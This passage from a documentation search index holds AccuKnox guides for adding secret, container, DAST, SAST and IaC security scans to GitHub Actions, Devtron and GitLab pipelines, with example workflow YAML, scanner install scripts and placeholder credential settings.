Integration","text":""},{"location":"integrations/github-actions-secret-scan/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox. Navigate to Settings and select Tokens to create an AccuKnox token to forward scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/github-actions-secret-scan/#step-2-configure-github-secrets","title":"Step 2: Configure GitHub Secrets","text":"<p>Define the following secrets in GitHub. For details on configuring the secrets/variables, refer to Using secrets in GitHub Actions.</p> <ul> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.F</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ul>"},{"location":"integrations/github-actions-secret-scan/#step-3-github-actions-workflow-setup","title":"Step 3: GitHub Actions Workflow Setup","text":"<p>Create or edit <code>.github/workflows/secret-scan.yml</code>:</p> <pre><code>name: AccuKnox Secret Scan Workflow\n\non:\n  push:\n    branches:\n      - secret\n\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@main\n\n      - name: AccuKnox Secret Scan TEST\n        uses: accuknox/secret-scan-action@v1.0.1\n        with:\n          token: ${{ secrets.ACCUKNOX_TOKEN }}\n          tenant_id: ${{ secrets.ACCUKNOX_TENANT }}\n          label: \"SPOC\"\n          endpoint: \"cspm.demo.accuknox.com\"\n          fail: true\n          use_extended_ruleset: false\n</code></pre>"},{"location":"integrations/github-actions-secret-scan/#inputs-for-accuknox-secret-scan-action","title":"Inputs for AccuKnox Secret Scan Action","text":"Input Name Description Optional/Required Default Value token The token for authenticating with the CSPM panel. Required None tenant_id The ID of the tenant. Required None label The label created in AccuKnox SaaS. Required None endpoint The URL of the CSPM panel to push the scan results to. Required <code>cspm.demo.accuknox.com</code> secret_scan_type Source type for scanning (<code>git</code>, <code>huggingface</code>, <code>s3</code>). Required <code>git</code> branch Branch to scan. Use branch name or <code>all-branches</code>. Optional <code>HEAD</code> branch exclude-paths Paths to exclude from the scan. Optional None args Additional arguments to pass to the CLI. Optional None dataset Dataset name (required if <code>secret_scan_type</code> is <code>huggingface</code>). Optional None huggingface_token Hugging Face token (required if <code>secret_scan_type</code> is <code>huggingface</code>). Optional None bucket_name S3 bucket name (required if <code>secret_scan_type</code> is <code>s3</code>). Optional None aws_access_key_id AWS Access Key ID (required if <code>secret_scan_type</code> is <code>s3</code>). Optional None aws_secret_access_key AWS Secret Access Key (required if <code>secret_scan_type</code> is <code>s3</code>). Optional None use_extended_ruleset Enable extended regex rules for detecting sensitive data. Optional <code>false</code> results Specifies which result types to output: <code>verified</code>, <code>unknown</code>, <code>unverified</code>, <code>filtered_unverified</code>. Defaults to all types. Optional <code>all</code> fail Fail the pipeline if secrets are found. Optional <code>false</code> upload_artifact Upload scan results as an artifact. Optional <code>true</code>"},{"location":"integrations/github-actions-secret-scan/#before-integration","title":"Before Integration","text":"<p>Without secret scanning in place, your GitHub workflow may unknowingly allow hardcoded credentials---like API keys or passwords---to be pushed to the repository, increasing the risk of sensitive data exposure</p>"},{"location":"integrations/github-actions-secret-scan/#after-integration","title":"After Integration","text":"<p>AccuKnox Secret Scanning will run on every push, detecting hard-coded secrets and sensitive information. The findings are sent to AccuKnox for review and remediation. Only the scan results are uploaded, not the sensitive data.</p> <p></p>"},{"location":"integrations/github-actions-secret-scan/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: Navigate to the Accuknox SaaS dashboard after the pipeline completes.</p> <p>Step 2: Go to Issues &gt; Findings and select Secret Scan Findings to see identified vulnerabilities.</p> <p></p>"},{"location":"integrations/github-actions-secret-scan/#step-3-review-detected-secrets","title":"Step 3: Review Detected Secrets","text":"<p>Examine the list of identified hardcoded secrets and sensitive information.</p> <p></p>"},{"location":"integrations/github-actions-secret-scan/#step-4-address-findings","title":"Step 4: Address Findings","text":"<p>For each finding, create a task in your issue-tracking system, advising secret rotation and the use of a secure secret management solution. Once resolved, mark the issue as fixed in the AccuKnox platform.</p> <p></p>"},{"location":"integrations/github-actions-secret-scan/#conclusion","title":"Conclusion","text":"<p>Integrating AccuKnox Secret Scanning in GitHub Actions provides an automated layer of security to identify and resolve exposed secrets early in the dev lifecycle, reducing risk and improving compliance posture.</p>"},{"location":"integrations/github-container-scan/","title":"Setting Up Container Scanning in GitHub CI/CD Pipeline","text":"<p>In this guide, we demonstrate how to incorporate AccuKnox's container scanning capabilities into a GitHub Actions workflow. The process ensures that vulnerabilities in Docker images are identified and remediated before deployment, significantly improving the security posture of your CI/CD pipeline.</p>"},{"location":"integrations/github-container-scan/#scenario-before-integration","title":"Scenario Before Integration","text":"<ul> <li> <p>Context: The Docker image was built using an outdated base image (<code>node:15-slim</code>) with known vulnerabilities, introducing security risks into the deployment pipeline.</p> </li> <li> <p>Issues:</p> <ul> <li> <p>Vulnerabilities in the base image were not detected.</p> </li> <li> <p>The image was pushed to the registry without any security validation.</p> </li> </ul> </li> </ul>"},{"location":"integrations/github-container-scan/#steps-for-integrating-accuknox","title":"Steps for Integrating AccuKnox","text":""},{"location":"integrations/github-container-scan/#step-1-generate-accuknox-token","title":"Step 1: Generate AccuKnox Token","text":"<p>Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/github-container-scan/#step-2-configure-github-secrets","title":"Step 2: Configure GitHub Secrets","text":"<p>Store the following values as GitHub repository secrets:</p> <ul> <li> <p><code>TOKEN</code>: AccuKnox API token.</p> </li> <li> <p><code>TENANT_ID</code>: AccuKnox Tenant ID.</p> </li> <li> <p><code>LABEL</code>: Custom label for associating scan results.</p> </li> <li> <p><code>ENDPOINT</code>: (Optional) AccuKnox API URL (default: <code>cspm.demo.accuknox.com</code>).</p> </li> </ul>"},{"location":"integrations/github-container-scan/#step-3-set-up-github-actions-workflow","title":"Step 3: Set Up GitHub Actions Workflow","text":"<p>Create a workflow YAML file in your repository <code>.github/workflows/accuknox-scan.yml</code>:</p> <pre><code>name: AccuKnox Scan Workflow\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n\njobs:\n  accuknox-cicd:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3\n\n      - name: Run AccuKnox CSPM Scan\n        uses: accuknox/container-scan-action@v0.0.1\n        with:\n          token: ${{ secrets.TOKEN }}\n          tenant_id: ${{ secrets.TENANT_ID }}\n          repository_name: ${{ github.repository }}\n          label: ${{ secrets.LABEL }}\n          endpoint: ${{ secrets.ENDPOINT }}\n          dockerfile_context: Dockerfile\n          tag: ${{ github.run_id }}\n          severity: CRITICAL\n          exit_code: 1\n</code></pre>"},{"location":"integrations/github-container-scan/#scenario-after-integration","title":"Scenario After Integration","text":"<ul> <li> <p>Workflow Enhancements:</p> <ul> <li> <p>The pipeline scans Docker images during the build process.</p> </li> <li> <p>Critical vulnerabilities halt the pipeline, ensuring only secure images are deployed.</p> </li> </ul> </li> <li> <p>Outcome:</p> <ul> <li> <p>Vulnerabilities are identified and remediated before the image reaches production.</p> </li> <li> <p>Secure images are pushed to the registry with confidence.</p> </li> </ul> </li> </ul>"},{"location":"integrations/github-container-scan/#viewing-results-in-accuknox-saas","title":"Viewing Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select Container Image Findings to see identified vulnerabilities. </p> <p>Step 3: Click on a vulnerability to view more details. </p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability </p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability. </p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the Github pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/github-container-scan/#conclusion","title":"Conclusion","text":"<p>By integrating AccuKnox into your GitHub CI/CD pipeline, container images are scanned and validated for security vulnerabilities. The integration prevents insecure images from being deployed and ensures a secure development lifecycle.</p>"},{"location":"integrations/github-dast/","title":"Integrating DAST with AccuKnox in a GitHub CI/CD Pipeline","text":"<p>To demonstrate the benefits of incorporating AccuKnox into a CI/CD pipeline using GitHub Actions to enhance security, consider a specific scenario involving a domain with known vulnerabilities. By integrating AccuKnox scanning into the pipeline, we can identify and resolve these security issues.</p> <p></p>"},{"location":"integrations/github-dast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>GitHub repository access.</p> </li> <li> <p>AccuKnox platform access.</p> </li> </ul>"},{"location":"integrations/github-dast/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/github-dast/#step-1-log-in-to-accuknox","title":"Step 1: Log in to AccuKnox","text":"<p>Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/github-dast/#step-2-configure-github-secrets","title":"Step 2: Configure GitHub Secrets","text":"<p>Add the following secrets in your GitHub repository under Settings &gt; Secrets and Variables &gt; Actions:</p> Secret Name Description <code>ACCUKNOX_TOKEN</code> AccuKnox API token for authorization. <code>ACCUKNOX_ENDPOINT</code> The AccuKnox API URL (e.g., <code>cspm.demo.accuknox.com</code>). <code>TENANT_ID</code> Your AccuKnox tenant ID."},{"location":"integrations/github-dast/#step-3-set-up-github-actions-workflow","title":"Step 3: Set Up GitHub Actions Workflow","text":"<p>Create or update the <code>.github/workflows/dast-scan.yml</code> file in your repository with the following YAML configuration:</p> <pre><code>name: AccuKnox DAST Scan Workflow\non:\n  push:\n    branches:\n      - main\n\njobs:\n  dast-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n\n      - name: Run AccuKnox DAST Scan\n        uses: accuknox/dast-scan-action@v1.0.0\n        with:\n          target_url: \"http://testphp.vulnweb.com\"\n          accuknox_endpoint: ${{ secrets.ACCUKNOX_ENDPOINT }}\n          tenant_id: ${{ secrets.TENANT_ID }}\n          accuknox_token: ${{ secrets.ACCUKNOX_TOKEN }}\n          label: \"my-dast-scan\"\n          severity_threshold: \"High\"\n          scan_type: \"baseline\"\n</code></pre> <p>NOTE</p> <p>The <code>label</code> parameter in the workflow (<code>\"my-dast-scan\"</code>) helps identify the scan in AccuKnox. You can customize this label by updating the value in the YAML file. For more details on creating and managing labels, refer to the How to Create Labels documentation.</p>"},{"location":"integrations/github-dast/#initial-workflow-without-accuknox-scan","title":"Initial Workflow Without AccuKnox Scan","text":"<p>Initially, the CI/CD pipeline does not include the AccuKnox scan. When you push changes to the repository, no security checks are performed, potentially allowing security issues in the application.</p>"},{"location":"integrations/github-dast/#workflow-after-accuknox-scan-integration","title":"Workflow After AccuKnox Scan Integration","text":"<p>After integrating AccuKnox into your GitHub Actions workflow, the next push triggers the pipeline to run a DAST scan. The AccuKnox scan identifies potential vulnerabilities in the application.</p> <p></p> <p>View Results in AccuKnox SaaS\u00b6</p> <p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select DAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability (e.g., Cross-Domain Misconfiguration).</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the Github CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/github-dast/#conclusion","title":"Conclusion","text":"<p>GitHub Actions, combined with AccuKnox scanning, provides enhanced security by identifying and mitigating vulnerabilities during the CI/CD process. This integration offers visibility into potential security issues and helps ensure a secure deployment environment. AccuKnox DAST integrates seamlessly with various CI/CD tools, including Jenkins, GitHub, GitLab, Azure Pipelines, and AWS CodePipelines.</p>"},{"location":"integrations/github-devtron-dast/","title":"AccuKnox ASPM DAST on Devtron with GitHub Integration","text":"<p>This document outlines the process of configuring AccuKnox ASPM DAST scans using Devtron and GitHub. The setup ensures that every code push to the configured branch triggers an automated DAST scan.</p>"},{"location":"integrations/github-devtron-dast/#prerequisites","title":"Prerequisites","text":"<ul> <li>A running Devtron instance with admin access</li> <li>A GitHub repository containing your application code</li> <li>AccuKnox ASPM DAST API credentials (Tenant ID, Token, Endpoint, Label, etc.)</li> <li>Docker access on the Devtron cluster</li> </ul>"},{"location":"integrations/github-devtron-dast/#setup-steps","title":"Setup Steps","text":""},{"location":"integrations/github-devtron-dast/#1-create-a-job-in-devtron","title":"1. Create a Job in Devtron","text":"<ol> <li>From the Devtron dashboard, go to Create \u2192 Job.</li> <li>Select Source Code.</li> <li>Choose your Git Account.</li> <li>Enter the Git URL of your repository.</li> <li>Add an empty <code>devtron-ci.yaml</code> to the root of your git directory:</li> </ol> <pre><code>version: v1\npipeline:\n  - name: clone-only\n    type: CI\n    tasks: []\n</code></pre>"},{"location":"integrations/github-devtron-dast/#2-create-job-workflow","title":"2. Create Job Workflow","text":"<ol> <li>Open the created job \u2192 Create Workflow.</li> <li>Inside the workflow, create a new pipeline:</li> <li>Name \u2192 e.g., <code>accuknox-dast-pipeline</code></li> <li>Source Type \u2192 Branch Fixed</li> <li> <p>Branch Name \u2192 The branch you want to scan (e.g., <code>main</code> or <code>develop</code>)</p> </li> <li> <p>In Basic Configuration, select Automatically trigger.  </p> </li> </ol>"},{"location":"integrations/github-devtron-dast/#3-add-dast-task-in-workflow","title":"3. Add DAST Task in Workflow","text":"<ol> <li>Inside the pipeline, go to Task to be executed \u2192 Add Task.</li> <li> <p>Configure task:</p> </li> <li> <p>Task Name \u2192 <code>Perform DAST</code></p> </li> <li>Task Type \u2192 <code>Shell</code></li> <li>Paste your DAST shell script</li> </ol> <p>Example execution command:</p> <pre><code>#!/bin/bash\n\nmkdir /tmp/scan-dir\nfind . -path './process' -prune -o -type f -print | cpio -pdm /tmp/scan-dir\ncd /tmp/scan-dir\n\npip install --break-system-packages https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.10.1/accuknox_aspm_scanner-0.10.1-py3-none-any.whl\n\naccuknox-aspm-scanner scan dast\\\n  --command \"$ZAP_SCRIPT -t $TARGET_URL -J results.json -I\"\\\n  --severity-threshold \"$SEVERITY\"\\\n  --container-mode\n</code></pre>"},{"location":"integrations/github-devtron-dast/#4-input-variables","title":"4. Input Variables","text":"<p>Add the necessary input variables for the script:</p> Variable Name Type Value / Options Description <code>SEVERITY</code> String HIGH / MEDIUM / LOW Minimum severity level that will fail the job. Example: <code>SEVERITY=HIGH</code> fails only if HIGH vulnerabilities are found. <code>TARGET_URL</code> String URL (e.g., https://juice-shop.herokuapp.com) The web application endpoint that ZAP will scan. <code>ZAP_SCRIPT</code> String <code>zap-full-scan.py</code> / <code>zap-baseline.py</code> <code>zap-full-scan.py</code> performs a full active scan (modifies target). <code>zap-baseline.py</code> performs a passive scan (safer). <p></p> <p></p>"},{"location":"integrations/github-devtron-dast/#5-add-accuknox-credentials-configmaps-secrets","title":"5. Add AccuKnox Credentials (ConfigMaps &amp; Secrets)","text":"<ol> <li>Go to ConfigMaps and Secrets section.</li> <li>Add required environment variables:</li> </ol> <p>Environment Variables (Examples):</p> <pre><code>ACCUKNOX_ENDPOINT=cspm.demo.accuknox.com\nACCUKNOX_TENANT=XXX\nACCUKNOX_LABEL=test123\nACCUKNOX_TOKEN=your_api_token_here\n</code></pre> <ol> <li>Choose Mount Data as an Environment Variable.</li> </ol> <p></p>"},{"location":"integrations/github-devtron-dast/#6-triggering-the-scan","title":"6. Triggering the Scan","text":"<ul> <li>Once the setup is done, every GitHub push to the specified branch will trigger the Devtron job.</li> <li> <p>The job will:</p> </li> <li> <p>Pull the latest code</p> </li> <li>Run the AccuKnox ASPM DAST shell script inside the container against your provided URL</li> <li>Upload scan results to the AccuKnox dashboard</li> </ul> <p></p> <p></p>"},{"location":"integrations/github-devtron-sast/","title":"AccuKnox ASPM SAST on Devtron with GitHub Integration","text":"<p>This document outlines the process of configuring AccuKnox ASPM SAST scans using Devtron and GitHub. The setup ensures that every code push to the configured branch triggers an automated SAST scan.</p>"},{"location":"integrations/github-devtron-sast/#prerequisites","title":"Prerequisites","text":"<ul> <li>A running Devtron instance with admin access</li> <li>A GitHub repository containing your application code</li> <li>AccuKnox ASPM SAST API credentials (Tenant ID, Token, Endpoint, Label, etc.)</li> </ul>"},{"location":"integrations/github-devtron-sast/#setup-steps","title":"Setup Steps","text":""},{"location":"integrations/github-devtron-sast/#1-create-a-job-in-devtron","title":"1. Create a Job in Devtron","text":"<ol> <li>From the Devtron dashboard, go to Create \u2192 Job.</li> <li>Select Source Code.</li> <li>Choose your Git Account.</li> <li> <p>Enter the Git URL of your repository.</p> </li> <li> <p>For private repos, use this: https://docs.devtron.ai/global-configurations/git-accounts</p> </li> <li>Add an empty <code>devtron-ci.yaml</code> to the root of your Git directory (this ensures the repo is cloned by Devtron):</li> </ol> <p></p> <pre><code>version: v1\npipeline:\n  - name: clone-only\n    type: CI\n    tasks: []\n</code></pre>"},{"location":"integrations/github-devtron-sast/#2-create-job-workflow","title":"2. Create Job Workflow","text":"<ol> <li>Open the created job \u2192 Create Workflow.</li> <li> <p>Inside the workflow, create a new pipeline:</p> </li> <li> <p>Name \u2192 e.g., <code>accuknox-sast-pipeline</code></p> </li> <li>Source Type \u2192 Branch Fixed</li> <li>Branch Name \u2192 The branch you want to scan (e.g., <code>main</code> or <code>develop</code>)</li> <li>In Basic Configuration, select Automatically trigger.</li> </ol> <p></p> <p></p> <p></p>"},{"location":"integrations/github-devtron-sast/#3-add-sast-task-in-workflow","title":"3. Add SAST Task in Workflow","text":"<ol> <li>Inside the pipeline, Task to be executed \u2192 Add Task.</li> <li> <p>Configure task:</p> </li> <li> <p>Task Name \u2192 <code>Perform SAST</code></p> </li> <li>Task Type \u2192 Shell</li> <li>Paste your SAST scan shell script</li> </ol> <p>N.B \u2014 We are using ASPM CLI by AccuKnox</p> <p>Example execution command:</p> <pre><code>#!/bin/bash\n\nmkdir /tmp/scan-dir\nfind . -path './process' -prune -o -type f -print | cpio -pdm /tmp/scan-dir\ncd /tmp/scan-dir\n\npip install --break-system-packages https://github.com/accuknox/aspm-scanner-cli/releases/download/v0.10.1/accuknox_aspm_scanner-0.10.1-py3-none-any.whl\naccuknox-aspm-scanner scan --softfail sast\n</code></pre>"},{"location":"integrations/github-devtron-sast/#4-add-accuknox-credentials-configmaps-secrets","title":"4. Add AccuKnox Credentials (ConfigMaps &amp; Secrets)","text":"<ol> <li>Go to ConfigMaps and Secrets section.</li> <li>Add required environment variables:</li> </ol> <p>Environment Variables (Examples):</p> <pre><code>ACCUKNOX_ENDPOINT=https://cspm.demo.accuknox.com\nACCUKNOX_TENANT=XXX\nACCUKNOX_LABEL=test123\nACCUKNOX_TOKEN=your_api_token_here\n</code></pre> <ol> <li>Choose Mount Data as Environment Variable. </li> </ol> <p></p>"},{"location":"integrations/github-devtron-sast/#5-triggering-the-scan","title":"5. Triggering the Scan","text":"<p>Once the setup is done, every GitHub push to the specified branch will trigger the Devtron job.</p> <p>The job will:</p> <ol> <li>Pull the latest code</li> <li>Run the AccuKnox ASPM SAST shell script inside the container</li> <li>Upload scan results to the AccuKnox dashboard</li> </ol> <p></p> <p></p>"},{"location":"integrations/github-iac/","title":"Integrating IaC with AccuKnox in a GitHub CI/CD Pipeline","text":"<p>This guide demonstrates how to integrate Infrastructure as Code (IaC) security into a GitHub CI/CD pipeline using AccuKnox. We will implement automated checks to identify configuration vulnerabilities in your IaC templates and send the results to AccuKnox for thorough analysis and remediation. This approach ensures your infrastructure is resilient and aligns with security best practices, effectively minimizing deployment risks.</p>"},{"location":"integrations/github-iac/#pre-requisites","title":"Pre-requisites","text":"<ol> <li> <p>GitHub Repository Access</p> </li> <li> <p>AccuKnox Platform Access</p> </li> </ol>"},{"location":"integrations/github-iac/#steps-for-integration","title":"Steps for Integration","text":""},{"location":"integrations/github-iac/#step-1-log-in-to-accuknox","title":"Step 1: Log in to AccuKnox","text":"<p>Navigate to Settings in the AccuKnox platform and select Tokens to create an AccuKnox token. This token will be used to forward scan results to SaaS. Refer to [How to Create Tokens] for details on generating tokens.</p>"},{"location":"integrations/github-iac/#step-2-configure-github-secrets","title":"Step 2: Configure GitHub Secrets","text":"<p>Go to your GitHub repository and configure the following secrets:</p> <ul> <li> <p><code>TOKEN</code>: AccuKnox API token for authorization.</p> </li> <li> <p><code>TENANT_ID</code>: Your AccuKnox tenant ID.</p> </li> <li> <p><code>ENDPOINT</code>: The AccuKnox API URL (e.g., <code>cspm.demo.accuknox.com</code>).</p> </li> <li> <p><code>LABEL</code>: The label for your scan.</p> </li> </ul> <p>To add secrets, go to Settings &gt; Secrets and variables &gt; Actions &gt; New repository secret in your GitHub repository.</p>"},{"location":"integrations/github-iac/#step-3-set-up-the-github-actions-workflow","title":"Step 3: Set Up the GitHub Actions Workflow","text":"<p>Create or edit a GitHub Actions workflow YAML file (e.g., <code>.github/workflows/iac-scan.yml</code>) with the following configuration:</p> <pre><code>name: AccuKnox IaC Scan Workflow\n\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3\n\n      - name: Run IaC scan\n        uses: accuknox/iac-scan-action@v0.0.1\n        with:\n          directory: \".\" # Optional: Directory to scan\n          compact: true  # Optional: Minimize output\n          quiet: true    # Optional: Show only failed checks\n          output_format: json  # Optional: Format of output\n          output_file_path: \"./results.json\" # Optional: Output file path\n          token: ${{ secrets.TOKEN }}\n          tenant_id: ${{ secrets.TENANT_ID }}\n          endpoint: ${{ secrets.ENDPOINT }}\n          label: ${{ secrets.LABEL }}\n</code></pre>"},{"location":"integrations/github-iac/#initial-cicd-pipeline-without-accuknox-iac-scan","title":"Initial CI/CD Pipeline Without AccuKnox IaC Scan","text":"<p>Initially, the GitHub Actions workflow does not include the AccuKnox IaC scan. When changes are pushed to the repository, no infrastructure security checks are performed, potentially allowing misconfigurations or vulnerabilities in the IaC code.</p>"},{"location":"integrations/github-iac/#cicd-pipeline-after-accuknox-iac-scan-integration","title":"CI/CD Pipeline After AccuKnox IaC Scan Integration","text":"<p>Once the AccuKnox IaC scan is integrated into the GitHub Actions workflow, every push or pull request triggers an IaC security scan. This scan identifies potential vulnerabilities or misconfigurations in the infrastructure code, enhancing security before deployment. The findings are then sent to the AccuKnox platform.</p>"},{"location":"integrations/github-iac/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the pipeline completes, navigate to the AccuKnox SaaS Dashboard</p> <p>Step 2: Go to Issues &gt; Findings and select IaC Findings to see identified vulnerabilities</p> <p></p> <p>Step 3: Click on a vulnerability to view more details and follow the instructions in the Solutions tab</p> <p></p> <p>Step 4: For unresolved vulnerabilities, create a ticket in your issue tracking system</p> <p></p> <p>Step 5: After fixing the vulnerabilities, rerun the GitHub Actions workflow and verify that the issues have been resolved in the AccuKnox dashboard</p>"},{"location":"integrations/github-iac/#conclusion","title":"Conclusion","text":"<p>By integrating the AccuKnox IaC scan into a GitHub CI/CD pipeline, you strengthen the security of your infrastructure code. This integration allows for early detection and remediation of misconfigurations and vulnerabilities in the development lifecycle, ensuring a more secure deployment environment.</p>"},{"location":"integrations/github-overview/","title":"Github Integrations","text":""},{"location":"integrations/github-overview/#github-integrations","title":"Github Integrations","text":"<p>SAST (Static Analysis)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p> <p></p>"},{"location":"integrations/github-sast/","title":"Integrating SAST with AccuKnox in a GitHub CI/CD Pipeline","text":""},{"location":"integrations/github-sast/#overview","title":"Overview","text":"<p>This guide explains how to use the AccuKnox SAST GitHub Action for integrating Static Application Security Testing (SAST) into a GitHub CI/CD pipeline. The process leverages SonarQube for scanning source code and uploads the results to AccuKnox CSPM for comprehensive vulnerability analysis and remediation.</p>"},{"location":"integrations/github-sast/#prerequisites","title":"Prerequisites","text":"<ol> <li> <p>GitHub Repository Access: Ensure you have access to your repository where the workflow will be implemented.</p> </li> <li> <p>SonarQube Access: Obtain API tokens and project details for SAST scanning.</p> </li> <li> <p>AccuKnox Platform Access: Access your AccuKnox CSPM dashboard and generate an API token for integrations.</p> </li> </ol>"},{"location":"integrations/github-sast/#steps-for-integration","title":"Steps for Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens</p> <p>Step 2: Define GitHub Secrets</p> <p>To securely store sensitive values, define the following secrets in your GitHub repository settings:</p> <p>Secret Configuration Table</p> Secret Name Description <code>SONAR_TOKEN</code> API token for authenticating with SonarQube. <code>SONAR_HOST_URL</code> URL of your SonarQube server. <code>TENANT_ID</code> AccuKnox CSPM tenant ID. <code>ACCUKNOX_TOKEN</code> API token for authenticating with AccuKnox. <code>ACCUKNOX_ENDPOINT</code> URL of the AccuKnox CSPM API. <p>Step 3: Create GitHub Workflow</p> <p>Add a new workflow file (<code>.github/workflows/sast.yml</code>) to your repository with the following configuration:</p> <pre><code>name: AccuKnox SAST Workflow\non:\n  push:\n    branches:\n      - main\n\njobs:\n  sast-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n\n      - name: Run AccuKnox SAST\n        uses: accuknox/accuknox-sast@v1.0.0\n        with:\n          sonar_token: ${{ secrets.SONAR_TOKEN }}\n          sonar_host_url: ${{ secrets.SONAR_HOST_URL }}\n          accuknox_endpoint: ${{ secrets.ACCUKNOX_ENDPOINT }}\n          tenant_id: ${{ secrets.TENANT_ID }}\n          accuknox_token: ${{ secrets.ACCUKNOX_TOKEN }}\n          label: \"my-sast-scan\"\n          sonar_project_key: \"my-project-key\"\n</code></pre>"},{"location":"integrations/github-sast/#inputs-for-accuknox-sast-action","title":"Inputs for AccuKnox SAST Action","text":"Input Name Description Required Default <code>sonar_token</code> Personal access token for authenticating with SonarQube. Yes None <code>sonar_host_url</code> URL of the SonarQube server for SAST. Yes None <code>accuknox_endpoint</code> URL of AccuKnox API to upload results. Yes None <code>tenant_id</code> Unique ID of the tenant for AccuKnox CSPM. Yes None <code>accuknox_token</code> Token for authenticating with the AccuKnox API. Yes None <code>label</code> Label for tagging results in AccuKnox SaaS. Yes None <code>sonar_project_key</code> SonarQube project key for identifying the project. Yes None"},{"location":"integrations/github-sast/#how-it-works","title":"How It Works","text":"<ol> <li> <p>Checkout Code: The workflow pulls the latest code from the repository.</p> </li> <li> <p>SonarQube SAST Scan: Runs a SAST scan on the code using SonarQube.</p> </li> <li> <p>Upload Results to AccuKnox: The scan results are uploaded to the AccuKnox CSPM platform for analysis and centralized monitoring.</p> </li> <li> <p>Quality Gate Check: Ensures the project meets the quality standards defined in SonarQube.</p> </li> </ol>"},{"location":"integrations/github-sast/#viewing-results-in-accuknox-saas","title":"Viewing Results in AccuKnox SaaS","text":""},{"location":"integrations/github-sast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the workflow completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select SAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the GitLab CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"integrations/github-sast/#benefits-of-integration","title":"Benefits of Integration","text":"<ul> <li> <p>Centralized monitoring and reporting of vulnerabilities.</p> </li> <li> <p>Early detection of issues during the development lifecycle.</p> </li> <li> <p>Actionable remediation guidance to improve code quality.</p> </li> <li> <p>Easy integration into existing GitHub pipelines.</p> </li> </ul> <p>By integrating SonarQube SAST with AccuKnox in a GitHub Actions workflow, you ensure a secure development pipeline while leveraging the best practices in vulnerability management.</p>"},{"location":"integrations/gitlab-container-scan/","title":"Securing Docker Images in GitLab CI/CD with AccuKnox Integration","text":"<p>This guide demonstrates integrating AccuKnox into GitLab CI/CD pipelines to improve Docker image security by identifying and remediating vulnerabilities during the build process. We will compare the pipeline's state before and after the integration to highlight the security improvements.</p>"},{"location":"integrations/gitlab-container-scan/#prerequisites","title":"Prerequisites","text":"<p>Before beginning, ensure the following:</p> <ul> <li> <p>A GitLab repository with CI/CD enabled</p> </li> <li> <p>Access to AccuKnox</p> </li> </ul>"},{"location":"integrations/gitlab-container-scan/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/gitlab-container-scan/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox. Navigate to Settings and select Tokens to create an AccuKnox token to forward scan results to 